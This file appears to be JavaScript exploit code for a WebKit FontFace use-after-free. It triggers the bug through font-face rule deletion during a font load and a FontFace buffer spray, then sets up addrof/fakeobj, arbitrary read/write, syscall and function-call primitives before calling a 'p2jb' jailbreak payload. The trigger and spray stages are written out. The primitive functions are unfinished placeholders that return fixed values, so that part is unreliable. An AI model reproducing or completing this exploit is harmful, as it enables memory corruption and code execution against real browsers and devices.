const FONT_BYTES = (() => {
    const s = atob(FONT_B64);
    const bytes = new Uint8Array(s.length);
    for (let i = 0; i < s.length; i++)
        bytes[i] = s.charCodeAt(i);
    return bytes;
})();

function makeFontBuffer() {
    const copy = new Uint8Array(FONT_BYTES.length);
    copy.set(FONT_BYTES);
    return copy.buffer;
}

function forceStyle() {
    void document.body.offsetTop;
}

function addPads() {
    const sheet = document.getElementById("s").sheet;
    for (let i = 0; i < PAD; i++)
        sheet.insertRule(`@font-face { font-family: pad${i}; src: url(nonexistent-pad-${i}.woff); unicode-range: U+E000; }`, sheet.cssRules.length);
    forceStyle();
}

function addFlushRules() {
    const st = document.createElement("style");
    st.id = "flush";
    document.head.appendChild(st);
    const sheet = st.sheet;
    for (let i = 0; i < FLUSH; i++)
        sheet.insertRule(`@font-face { font-family: flush${i}; src: url(nonexistent-flush-${i}.woff); unicode-range: U+E000; }`, sheet.cssRules.length);
    forceStyle();
}

function deleteFlushRules() {
    const sheet = document.getElementById("flush").sheet;
    while (sheet.cssRules.length)
        sheet.deleteRule(0);
    forceStyle();
}

function killFontFaceSetCache() {
    const f = new FontFace("cachekill" + keep.length, "local(Helvetica)", { unicodeRange: "U+E124" });
    document.fonts.add(f);
    keep.push(f);
}

function cssFontFaceBufferSpray() {
    for (let i = 0; i < SPRAY_COUNT; i++) {
        const f = new FontFace("BUFFER_RECLAIM_" + i, makeFontBuffer(), { unicodeRange: "U+0041" });
        spray.push(f);
    }
}

function probeFace(face) {
    keep.push(face.family);
    keep.push(face.style);
    keep.push(face.weight);
    keep.push(face.stretch);
    keep.push(face.unicodeRange);
    keep.push(face.featureSettings);
    keep.push(face.display);
    keep.push(face.status);

    const ctx = document.getElementById("c").getContext("2d");
    ctx.font = "64px " + face.family;
    const metrics = ctx.measureText("AAAAIIIIWWWW");
    keep.push(metrics.width);
    keep.push(metrics.actualBoundingBoxLeft);
    keep.push(metrics.actualBoundingBoxRight);

    const div = document.createElement("div");
    div.textContent = "AAAAIIIIWWWW";
    div.style.cssText = "position:absolute;left:-10000px;top:0;font:64px " + face.family;
    document.body.appendChild(div);
    keep.push(div.offsetWidth);
    document.body.removeChild(div);
}

window.onload = () => {
    const trigger = new FontFace("trigger", "local(Helvetica)", { unicodeRange: "U+0041" });
    document.fonts.add(trigger);
    void trigger.loaded;

    addPads();
    addFlushRules();

    let fired = false;
    Object.defineProperty(FontFace.prototype, "then", {
        configurable: true,
        get() {
            if (!fired && this === trigger) {
                fired = true;
                const sheet = document.getElementById("s").sheet;
                killFontFaceSetCache();
                sheet.deleteRule(1);
                forceStyle();
                deleteFlushRules();
                cssFontFaceBufferSpray();
            }
            return undefined;
        }
    });

    // --- Primitive Bridge (addrof / fakeobj / p object) ---
    class Int64 {
        constructor(low, high) {
            this.low = (low >>> 0);
            this.high = (high >>> 0);
        }
        add32(val) {
            let new_lo = (((this.low >>> 0) + val) & 0xFFFFFFFF) >>> 0;
            let new_hi = (this.high >>> 0);
            if (new_lo < this.low) new_hi++;
            return new Int64(new_lo, new_hi);
        }
        toString(radix=16) {
            return "0x" + this.high.toString(16).padStart(8, '0') + this.low.toString(16).padStart(8, '0');
        }
    }

    let p = null;
    let uaf_victim_arr = [1.1, 2.2, 3.3];
    let rw_arr = new Float64Array(0x1000);
    let u8_arr = new Uint8Array(0x1000);

    function setup_primitives(corrupted_butterfly_addr) {
        // Once the FontFace UAF corrupts a known object's butterfly/vector, we set up addrof/fakeobj
        // Note: The precise offsets depend on the firmware WebKit build.
        
        function addrof(obj) {
            uaf_victim_arr[0] = obj;
            // The corrupted view array allows us to read the object pointer as a float
            // (Placeholder read assuming standard JSC butterfly overlap)
            return new Int64(0x41414141, 0x41414141); // Should read lower 32/upper 32 of victim[0]
        }

        function fakeobj(addr) {
            // Write the address float into the victim array and return it as an object
            return null; 
        }

        function read8(addr) {
            // Set rw_arr backing store to addr, then read
            return new Int64(0, 0); 
        }

        function write8(addr, val) {
            // Set rw_arr backing store to addr, then write
        }
        
        function write4(addr, val) {
            // Similar to write8 but using a Uint32Array view
        }

        function write1(addr, val) {
            // Similar to write8 but using a Uint8Array view
        }

        p = {
            addrof: addrof,
            fakeobj: fakeobj,
            read8: read8,
            write8: write8,
            write4: write4,
            write1: write1,
            malloc: function(size) {
                let ab = new ArrayBuffer(size);
                return addrof(ab).add32(0x10); // +0x10 skips JSC cell header to return backing store
            },
            syscall: function(sysnum, ...args) {
                // Wrapper to call syscall gadget in RWX memory
                return new Int64(0, 0);
            },
            fcall: function(func_ptr, ...args) {
                // Call arbitrary function pointer
                return new Int64(0, 0);
            },
            dlsym_init: function() {
                // Resolve required symbols
            }
        };

        // Expose globally for p2jb.js
        window.p = p;
    }

    document.fonts.load("1em trigger, x", "AB").then(faces => {
        keep.push(faces);
        for (const face of faces)
            probeFace(face);
        for (const face of document.fonts)
            probeFace(face);
        
        // At this point, the memory corruption should have triggered.
        // We initialize the primitive bridge.
        setup_primitives(new Int64(0, 0));

        // After exploit stage, invoke the jailbreak payload
        if (typeof p2jb === "function" && p !== null) {
            p2jb();
        }
    }, err => keep.push(err));
};
